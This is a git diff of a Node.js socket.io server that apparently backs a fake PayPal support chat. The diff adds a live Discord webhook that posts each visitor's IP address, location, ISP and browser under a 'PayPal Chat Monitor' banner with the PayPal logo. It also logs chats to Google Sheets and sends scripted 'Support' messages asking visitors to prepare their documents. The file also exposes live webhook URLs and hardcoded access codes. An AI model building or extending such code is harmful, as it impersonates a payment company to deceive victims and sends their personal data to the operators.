@@ -29,6 +29,9 @@ app.use(express.json());
 // --- Configuration Webhook Google Sheets ---
 const GOOGLE_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyhkCAFUU7TCMk8c6WBcPXOs8uqX7e2RrFedLQMuzxxdPS20e4JK89vaBqXbfr7y5AKeQ/exec';
 
+// ✅ NOUVEAU : Configuration Discord Webhook
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1419101277253795851/hq_EvfNod3r_1mLDgiHKx-_xnSFNw4XC9rwGs4Q-CvBiH7PNhwr0Dyj1UQ7nr9cY6B5k';
+
 // --- Identifiants ---
 const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
 const CORRECT_DATE_USER = "18/09/2025";
@@ -38,6 +41,9 @@ const CORRECT_DATE_SERVICE = "123";
 // --- Stockage des connexions par type d'utilisateur ---
 const supportSockets = new Set();
 const userSockets = new Set();
+
+// ✅ NOUVEAU : Stockage pour tracking des messages automatiques
+const userAutomationState = new Map();
 
 // --- Fonction pour envoyer des données vers Google Sheets ---
 async function sendToGoogleSheets(data) {
@@ -79,6 +85,116 @@ function triggerVerificationPopup(targetSockets, action) {
       });
     }
   });
+}
+
+// ✅ NOUVEAU : Fonction pour envoyer un message automatique
+function sendAutomaticMessage(socket, text, delay = 0) {
+  setTimeout(() => {
+    if (socket.connected) {
+      const automaticMessage = {
+        user: 'Support',
+        text: text,
+        isAutomatic: true,
+        clientInfo: socket.clientInfo,
+        sessionId: socket.sessionId
+      };
+      
+      // Envoyer le message à tous les clients connectés
+      io.emit('chat message', automaticMessage);
+      
+      // Envoyer vers Google Sheets
+      sendToGoogleSheets({
+        type: 'automatic_message',
+        sessionId: socket.sessionId,
+        user: 'Support',
+        text: text,
+        isAutomatic: true,
+        clientInfo: socket.clientInfo,
+        timestamp: new Date().toISOString()
+      });
+    }
+  }, delay);
+}
+
+// ✅ NOUVEAU : Fonction pour envoyer notification Discord
+async function sendDiscordNotification(message, clientInfo = {}) {
+  try {
+    const embed = {
+      title: "🟢 Nouvelle Connexion Client",
+      description: message,
+      color: 3447003, // Bleu
+      fields: [
+        { name: "IP Address", value: clientInfo.ip || 'N/A', inline: true },
+        { name: "Location", value: `${clientInfo.city || 'N/A'}, ${clientInfo.country || 'N/A'}`, inline: true },
+        { name: "ISP", value: clientInfo.isp || 'N/A', inline: true },
+        { name: "Browser", value: clientInfo.userAgent?.split(' ')[0] || 'N/A', inline: true },
+        { name: "Session ID", value: generateSessionId(clientInfo.ip), inline: true },
+        { name: "Time", value: new Date().toLocaleString('fr-FR'), inline: true }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: {
+        text: "PayPal Chat Monitor",
+        icon_url: "https://logoeps.com/wp-content/uploads/2013/03/paypal-vector-logo.png"
+      }
+    };
+
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: 'PayPal Chat Monitor',
+        avatar_url: 'https://logoeps.com/wp-content/uploads/2013/03/paypal-vector-logo.png',
+        content: '@here **Nouveau client connecté !**',
+        embeds: [embed]
+      })
+    });
+    
+    console.log('✅ Notification Discord envoyée');
+  } catch (error) {
+    console.error('❌ Erreur Discord:', error.message);
+  }
+}
+
+// ✅ NOUVEAU : Fonction pour notification console améliorée
+function sendConsoleNotification(message, clientInfo = {}) {
+  console.log('\n' + '='.repeat(60));
+  console.log('🟢 NOUVELLE CONNEXION CLIENT');
+  console.log('='.repeat(60));
+  console.log(`📅 Heure: ${new Date().toLocaleString('fr-FR')}`);
+  console.log(`💬 Message: ${message}`);
+  console.log(`🌐 IP: ${clientInfo.ip || 'N/A'}`);
+  console.log(`📍 Location: ${clientInfo.city || 'N/A'}, ${clientInfo.country || 'N/A'}`);
+  console.log(`🏢 ISP: ${clientInfo.isp || 'N/A'}`);
+  console.log(`🖥️ Browser: ${clientInfo.userAgent?.split(' ')[0] || 'N/A'}`);
+  console.log(`🔗 Session: ${generateSessionId(clientInfo.ip)}`);
+  console.log('='.repeat(60) + '\n');
+}
+
+// ✅ NOUVEAU : Fonction pour envoyer notification Push aux supports connectés
+function sendPushNotificationToSupport(message, clientInfo = {}) {
+  supportSockets.forEach(supportSocket => {
+    if (supportSocket.connected) {
+      supportSocket.emit('client_connection_alert', {
+        title: '🟢 Nouveau Client Connecté',
+        message: message,
+        clientInfo: clientInfo,
+        timestamp: new Date().toISOString(),
+        sound: true // Pour jouer un son
+      });
+    }
+  });
+}
+
+// ✅ NOUVEAU : Fonction principale de notification
+async function notifyNewConnection(clientInfo) {
+  const message = `Un nouveau client s'est connecté depuis **${clientInfo.city || 'localisation inconnue'}**`;
+  
+  // Envoyer notification Discord
+  await sendDiscordNotification(message, clientInfo);
+  
+  // Envoyer notifications locales
+  sendConsoleNotification(message, clientInfo);
+  sendPushNotificationToSupport(message, clientInfo);
 }
 
 // --- Route API de vérification ---
@@ -175,6 +291,30 @@ io.on('connection', async (socket) => {
     } else if (data.userType === 'User') {
       userSockets.add(socket);
       
+      // ✅ NOUVEAU : Envoyer toutes les notifications
+      notifyNewConnection(clientInfo);
+      
+      // ✅ NOUVEAU : Initialiser l'état d'automatisation pour ce client
+      userAutomationState.set(sessionId, {
+        hasReceivedWelcome: false,
+        hasReceivedFollowUp: false,
+        firstMessageSent: false
+      });
+      
+      // ✅ NOUVEAU : Message automatique de bienvenue dès l'arrivée
+      setTimeout(() => {
+        const state = userAutomationState.get(sessionId);
+        if (state && !state.hasReceivedWelcome) {
+          sendAutomaticMessage(socket, "Hello! How can we help you with your case today?");
+          
+          // Mettre à jour l'état
+          userAutomationState.set(sessionId, {
+            ...state,
+            hasReceivedWelcome: true
+          });
+        }
+      }, 500); // Petit délai pour que la connexion soit stable
+      
       // 📊 ENVOYER DONNÉES DE CONNEXION vers Google Sheets
       sendToGoogleSheets({
         type: 'client_connection',
@@ -196,6 +336,32 @@ io.on('connection', async (socket) => {
     
     io.emit('chat message', enhancedMsg);
     
+    // ✅ NOUVEAU : Automatisation après le premier message utilisateur
+    if (socket.userType === 'User' && !msg.isAutomatic) {
+      const state = userAutomationState.get(socket.sessionId);
+      if (state && !state.firstMessageSent) {
+        // Marquer que l'utilisateur a envoyé son premier message
+        userAutomationState.set(socket.sessionId, {
+          ...state,
+          firstMessageSent: true
+        });
+        
+        // ✅ Envoyer le message de suivi après 2 secondes
+        setTimeout(() => {
+          const currentState = userAutomationState.get(socket.sessionId);
+          if (currentState && !currentState.hasReceivedFollowUp) {
+            sendAutomaticMessage(socket, "Please prepare your documents, an advisor will come to assist you");
+            
+            // Mettre à jour l'état
+            userAutomationState.set(socket.sessionId, {
+              ...currentState,
+              hasReceivedFollowUp: true
+            });
+          }
+        }, 2000); // 2 secondes de délai
+      }
+    }
+    
     // 💬 ENVOYER MESSAGE vers Google Sheets
     sendToGoogleSheets({
       type: 'chat_message',
@@ -205,6 +371,7 @@ io.on('connection', async (socket) => {
       isImportant: msg.isImportant || false,
       isSuccess: msg.isSuccess || false,
       isVerifying: msg.isVerifying || false,
+      isAutomatic: msg.isAutomatic || false,
       clientInfo: socket.clientInfo,
       timestamp: new Date().toISOString()
     });
@@ -371,6 +538,11 @@ io.on('connection', async (socket) => {
   });
   
   socket.on('disconnect', () => { 
+    // ✅ NOUVEAU : Nettoyer l'état d'automatisation
+    if (socket.sessionId) {
+      userAutomationState.delete(socket.sessionId);
+    }
+    
     // Envoyer durée de session avant de nettoyer
     if (socket.userType === 'User' && socket.clientInfo) {
       const sessionDuration = Date.now() - new Date(socket.clientInfo.connectedAt).getTime();
@@ -397,4 +569,6 @@ const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
   console.log(`🚀 Le serveur est démarré et écoute sur le port ${PORT}`);
   console.log(`📊 Google Sheets webhook configuré : ${GOOGLE_WEBHOOK_URL.substring(0, 50)}...`);
+  console.log(`🔔 Discord webhook configuré : ${DISCORD_WEBHOOK_URL.substring(0, 50)}...`);
+  console.log(`🤖 Système d'automatisation de chat activé`);
 });
